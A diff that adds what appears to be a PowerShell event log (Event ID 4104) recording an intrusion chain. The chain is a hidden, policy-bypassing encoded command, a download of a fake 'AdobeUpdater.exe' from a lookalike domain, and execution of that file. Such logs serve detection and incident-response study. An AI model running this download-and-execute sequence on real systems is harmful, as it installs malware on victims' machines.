@@ -1,1 +1,22 @@
+[2026-06-18 10:32:48]
+Event ID: 4104
+User: emma.williams
 
+Command:
+powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgApAA==
+
+--------------------------------------------------
+
+[2026-06-18 10:32:51]
+Event ID: 4104
+
+Command:
+Invoke-WebRequest -Uri http://update-sharepoint-storage.com/AdobeUpdater.exe -OutFile C:\Users\Public\AdobeUpdater.exe
+
+--------------------------------------------------
+
+[2026-06-18 10:32:56]
+Event ID: 4104
+
+Command:
+Start-Process C:\Users\Public\AdobeUpdater.exe
